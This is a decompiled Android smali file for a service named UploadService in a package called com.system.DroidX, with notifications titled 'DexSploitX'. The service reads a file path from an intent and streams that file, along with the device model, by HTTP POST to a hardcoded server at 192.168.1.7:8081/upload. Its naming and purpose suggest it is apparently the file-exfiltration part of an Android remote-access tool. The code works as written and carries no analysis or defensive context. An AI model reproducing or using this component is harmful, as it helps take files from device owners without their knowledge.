.class public Lcom/system/DroidX/utils/UploadService;
.super Landroid/app/Service;
.source "UploadService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "upload_channel"

.field private static final NOTIFICATION_ID:I = 0x1


# instance fields
.field private executor:Ljava/util/concurrent/ExecutorService;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private createNotification(Ljava/lang/String;)Landroid/app/Notification;
    .locals 2

    .line 130
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    const-string v1, "upload_channel"

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "DexSploitX"

    .line 131
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 132
    invoke-virtual {v0, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const v0, 0x1080088

    .line 133
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    .line 134
    invoke-virtual {p1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    return-object p1
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 118
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 119
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "File Upload"

    const/4 v2, 0x2

    const-string v3, "upload_channel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 124
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/system/DroidX/utils/UploadService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 125
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    return-void
.end method

.method private updateNotification(Ljava/lang/String;)V
    .locals 2

    .line 138
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/system/DroidX/utils/UploadService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    const/4 v1, 0x1

    .line 139
    invoke-direct {p0, p1}, Lcom/system/DroidX/utils/UploadService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p1

    invoke-virtual {v0, v1, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    return-void
.end method

.method private uploadFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 19

    move-object/from16 v1, p0

    move-object/from16 v2, p2

    .line 44
    const-string v3, ":"

    const-string v4, "UploadService"

    const-string v0, "\r\n"

    .line 0
    const-string v5, "Content-Disposition: form-data; name=\"file\"; filename=\""

    const-string v6, "--"

    const-string v7, "multipart/form-data; boundary="

    const-string v8, "----WebKitFormBoundary"

    .line 44
    :try_start_0
    new-instance v9, Ljava/io/File;

    move-object/from16 v10, p1

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 45
    invoke-virtual {v9}, Ljava/io/File;->exists()Z

    move-result v10

    if-nez v10, :cond_0

    .line 46
    const-string v0, "Upload failed: File not found"

    invoke-direct {v1, v0}, Lcom/system/DroidX/utils/UploadService;->updateNotification(Ljava/lang/String;)V

    .line 47
    invoke-virtual {v1}, Lcom/system/DroidX/utils/UploadService;->stopSelf()V

    return-void

    .line 51
    :cond_0
    new-instance v10, Ljava/net/URL;

    const-string v11, "http://192.168.1.7:8081/upload"

    invoke-direct {v10, v11}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 52
    invoke-virtual {v10}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    check-cast v10, Ljava/net/HttpURLConnection;

    .line 54
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v12

    invoke-virtual {v11, v12, v13}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v11, 0x1

    .line 56
    invoke-virtual {v10, v11}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 57
    const-string v12, "POST"

    invoke-virtual {v10, v12}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 58
    const-string v12, "Content-Type"

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v10, v12, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v7, 0x2000

    .line 59
    invoke-virtual {v10, v7}, Ljava/net/HttpURLConnection;->setChunkedStreamingMode(I)V

    const/16 v12, 0x7530

    .line 60
    invoke-virtual {v10, v12}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    const v12, 0x927c0

    .line 61
    invoke-virtual {v10, v12}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 63
    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    .line 64
    new-instance v13, Ljava/io/PrintWriter;

    new-instance v14, Ljava/io/OutputStreamWriter;

    const-string v15, "UTF-8"

    invoke-direct {v14, v12, v15}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v13, v14, v11}, Ljava/io/PrintWriter;-><init>(Ljava/io/Writer;Z)V

    .line 67
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v11

    invoke-virtual {v11, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 68
    const-string v11, "Content-Disposition: form-data; name=\"device\""

    invoke-virtual {v13, v11}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v11

    invoke-virtual {v11, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 69
    invoke-virtual {v13, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 70
    sget-object v11, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v13, v11}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v11

    invoke-virtual {v11, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v11

    invoke-virtual {v11}, Ljava/io/PrintWriter;->flush()V

    .line 73
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v13, v11}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v11

    invoke-virtual {v11, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 74
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v11, "\""

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 75
    const-string v5, "Content-Type: application/octet-stream"

    invoke-virtual {v13, v5}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    .line 76
    invoke-virtual {v13, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/PrintWriter;->flush()V

    .line 79
    new-instance v5, Ljava/io/FileInputStream;

    invoke-direct {v5, v9}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 80
    new-array v7, v7, [B

    .line 82
    invoke-virtual {v9}, Ljava/io/File;->length()J

    move-result-wide v14

    const-wide/16 v16, 0x0

    .line 85
    :goto_0
    invoke-virtual {v5, v7}, Ljava/io/FileInputStream;->read([B)I

    move-result v11

    move-object/from16 p1, v5

    const/4 v5, -0x1

    if-eq v11, v5, :cond_1

    const/4 v5, 0x0

    .line 86
    invoke-virtual {v12, v7, v5, v11}, Ljava/io/OutputStream;->write([BII)V

    move-object v5, v9

    move-object/from16 v18, v10

    int-to-long v9, v11

    add-long v16, v16, v9

    const-wide/16 v9, 0x64

    mul-long v9, v9, v16

    .line 89
    div-long/2addr v9, v14

    long-to-int v9, v9

    .line 90
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "Uploading "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " - "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "%"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v1, v9}, Lcom/system/DroidX/utils/UploadService;->updateNotification(Ljava/lang/String;)V

    move-object v9, v5

    move-object/from16 v10, v18

    move-object/from16 v5, p1

    goto :goto_0

    :cond_1
    move-object v5, v9

    move-object/from16 v18, v10

    .line 93
    invoke-virtual/range {p1 .. p1}, Ljava/io/FileInputStream;->close()V

    .line 95
    invoke-virtual {v13, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v7

    invoke-virtual {v7}, Ljava/io/PrintWriter;->flush()V

    .line 96
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v13, v6}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/PrintWriter;->flush()V

    .line 97
    invoke-virtual {v13}, Ljava/io/PrintWriter;->close()V

    .line 99
    invoke-virtual/range {v18 .. v18}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    const/16 v6, 0xc8

    if-ne v0, v6, :cond_2

    .line 101
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Upload completed: "

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Lcom/system/DroidX/utils/UploadService;->updateNotification(Ljava/lang/String;)V

    .line 102
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "UPLOAD_SUCCESS:"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v5}, Ljava/io/File;->length()J

    move-result-wide v5

    invoke-virtual {v0, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 104
    :cond_2
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Upload failed: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v1, v5}, Lcom/system/DroidX/utils/UploadService;->updateNotification(Ljava/lang/String;)V

    .line 105
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "UPLOAD_FAILED:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 109
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Upload error: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v1, v5}, Lcom/system/DroidX/utils/UploadService;->updateNotification(Ljava/lang/String;)V

    .line 110
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "UPLOAD_ERROR:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 114
    :goto_1
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v2, Lcom/system/DroidX/utils/UploadService$$ExternalSyntheticLambda0;

    invoke-direct {v2, v1}, Lcom/system/DroidX/utils/UploadService$$ExternalSyntheticLambda0;-><init>(Lcom/system/DroidX/utils/UploadService;)V

    const-wide/16 v3, 0xbb8

    invoke-virtual {v0, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method


# virtual methods
.method synthetic lambda$onStartCommand$0$com-system-DroidX-utils-UploadService(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 37
    invoke-direct {p0, p1, p2}, Lcom/system/DroidX/utils/UploadService;->uploadFile(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method synthetic lambda$uploadFile$1$com-system-DroidX-utils-UploadService()V
    .locals 0

    .line 114
    invoke-virtual {p0}, Lcom/system/DroidX/utils/UploadService;->stopSelf()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    .line 25
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 26
    invoke-direct {p0}, Lcom/system/DroidX/utils/UploadService;->createNotificationChannel()V

    .line 27
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/system/DroidX/utils/UploadService;->executor:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method public onDestroy()V
    .locals 1

    .line 149
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 150
    iget-object v0, p0, Lcom/system/DroidX/utils/UploadService;->executor:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_0

    .line 151
    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 32
    const-string p2, "filePath"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 33
    const-string p3, "fileName"

    invoke-virtual {p1, p3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 35
    new-instance p3, Ljava/lang/StringBuilder;

    const-string v0, "Uploading "

    invoke-direct {p3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-direct {p0, p3}, Lcom/system/DroidX/utils/UploadService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p3

    const/4 v0, 0x1

    invoke-virtual {p0, v0, p3}, Lcom/system/DroidX/utils/UploadService;->startForeground(ILandroid/app/Notification;)V

    .line 37
    iget-object p3, p0, Lcom/system/DroidX/utils/UploadService;->executor:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/system/DroidX/utils/UploadService$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0, p2, p1}, Lcom/system/DroidX/utils/UploadService$$ExternalSyntheticLambda1;-><init>(Lcom/system/DroidX/utils/UploadService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {p3, v0}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    const/4 p1, 0x2

    return p1
.end method
